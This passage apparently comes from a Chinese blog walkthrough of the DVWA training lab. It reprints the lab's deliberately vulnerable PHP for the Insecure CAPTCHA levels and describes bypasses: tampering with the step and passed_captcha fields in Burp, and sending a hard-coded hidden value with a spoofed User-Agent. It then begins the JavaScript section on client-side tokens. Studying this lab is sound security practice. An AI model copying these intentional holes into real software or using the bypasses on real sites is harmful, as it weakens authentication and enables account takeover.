class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords  match? 验证通过时，匹配两次密码是否一致</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// Show next stage for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span><br><span class="hljs-string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="hljs-subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="hljs-subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span><br><span class="hljs-string">                &lt;/form&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Both new passwords do not match.</span><br>            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;<br>            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//第二阶段，检查两次密码是否一致，并更新密码</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;step&#x27;</span> ] == <span class="hljs-string">&#x27;2&#x27;</span> ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check to see if both password match</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with the passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>源码分析总共分为两个阶段：</p>
<ol>
<li>对用户的身份进行验证，step为1，验证成功后才能进行密码修改</li>
<li>step为2，两次输入的密码一致可以进行修改</li>
</ol>
<p>我们考虑直接跳过第一阶段，输入一密码一致，burp抓包修改step的值进行直接改密码。</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;step&#x27;</span> ] == <span class="hljs-string">&#x27;1&#x27;</span> ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span><br>    <span class="hljs-variable">$resp</span> = recaptcha_check_answer(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span> ],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>    );<br><br>    <span class="hljs-comment">// Did the CAPTCHA fail?</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-variable">$resp</span> ) &#123;<br>        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span><br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// Show next stage for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span><br><span class="hljs-string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="hljs-subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="hljs-subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;</span><br><span class="hljs-string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span><br><span class="hljs-string">                &lt;/form&gt;&quot;</span>;<br>                <span class="hljs-comment">//对参数passed_captcha进行验证，如果通过身份验证，该参数就为true</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Both new passwords do not match.</span><br>            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;<br>            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;step&#x27;</span> ] == <span class="hljs-string">&#x27;2&#x27;</span> ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check to see if they did stage 1</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;passed_captcha&#x27;</span> ] ) &#123;<br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Check to see if both password match</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with the passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>与Low相比怎加了一个passed_capt，当passed_capt为true时可以修改密码，同样使用抓包修改相关值</p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?php<br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span><br>    <span class="hljs-variable">$resp</span> = recaptcha_check_answer(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span> ],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>    );<br><span class="hljs-comment">//（通过身份验证条件）或者 （参数g-recaptcha-respon为hidd3n_valu3并且参数 HTTP_USER_AGE为 reCAPTC）就算是验证通过了</span><br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-variable">$resp</span> || <br>        (<br>            <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="hljs-string">&#x27;hidd3n_valu3&#x27;</span><br>            &amp;&amp; <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="hljs-string">&#x27;reCAPTCHA&#x27;</span><br>        )<br>    )&#123;<br>        <span class="hljs-comment">// CAPTCHA was correct. Do both new passwords match?</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span>) &#123;<br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>            <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27; LIMIT 1;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Ops. Password mismatch</span><br>            <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;<br>            <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span><br>        <span class="hljs-variable">$html</span>     .= <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以看到，验证过程部分步走合在了一个阶段里了，服务器的验证逻辑时当谷歌验证返回的结果是false并且参数ecaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于（reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数recaptcha_response_field、User-Agent上。</p>
<p><strong>impossible</strong><br>这个级别的代码增加了token机制防御csrf攻击，利用pdo技术防护sql注入，验证过程是一部分同时需要输入以前的密码，进一步加强了身份认证。</p>
<h2 id="DVWA-–-Javascript"><a href="#DVWA-–-Javascript" class="headerlink" title="DVWA – Javascript"></a>DVWA – Javascript</h2><p>这里的JavaScript其实指的是JavaScript Attack也就是js攻击。JavaScript是一种基于对象和事件驱动的、具有安全性的脚本语言。是一种解释型语言（代码不需要预编译）。通常JavaScript脚本是通过嵌入html中来实现自身的功能的。</p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*</span><br><span class="hljs-string">MD5 code from here</span><br><span class="hljs-string">https://github.com/blueimp/JavaScript-MD5</span><br><span class="hljs-string">*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    function rot13(inp) &#123;</span><br><span class="hljs-string">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    function generate_token() &#123;</span><br><span class="hljs-string">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="hljs-string">        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    generate_token();</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们知道中间的一大堆使用md5生成了加密token,和之前的源码不同在于这次的token实在前端生成的，generate_token()函数的作用是获取phrase参数中的值，将其的rot13加密的结果进行md5加密作为token值</p>
<p>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-21-05-19.png" alt="尝试" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

